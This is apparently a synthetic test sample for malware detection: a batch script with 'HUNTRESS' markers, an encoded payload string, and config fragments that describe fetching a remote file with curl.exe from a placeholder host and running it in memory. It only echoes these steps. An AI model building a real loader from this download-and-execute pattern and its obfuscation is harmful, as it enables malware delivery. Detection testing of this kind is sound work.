@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|xor_5a
rem HUNTRESS-MATERIAL:LGdrJikuPyopZzs5Ky8zKD8FKD83NS4/dj4zKSo7LjkyBTc/NzUoIyY7PjsqLj8oZzkvKDZ0PyI/JikuOz0/BTk1LzQuZ2smPSg7KjJnPjM7NzU0PiY0PyIuBTY7ND0vOz0/ZzQ1ND8mOTs3KjszPTQFMz5nOTs3KjszPTR3Pzk4bWxoajhsOSYvKDZnMi4uKilgdXU/OThtbGhqOGw5dD8iOzcqNj90MzQsOzYzPnVvOW1jO25qOHQ+Oy4=
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set h0=v=1^|steps=acquire_remote,dispatch_memory^|adapte
set h1=r=curl.exe^|stage_count=1^|graph=diamond^|next_lan
set h2=guage=none^|campaign_id=campaign-ecb7620b6c^|url=
set h3=https://ecb7620b6c.example.invalid/5c79a40b.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=69400f1f"
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%h%%G%%"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe GET https://ecb7620b6c.example.invalid/5c79a40b.dat then dispatch memory
exit /b 0
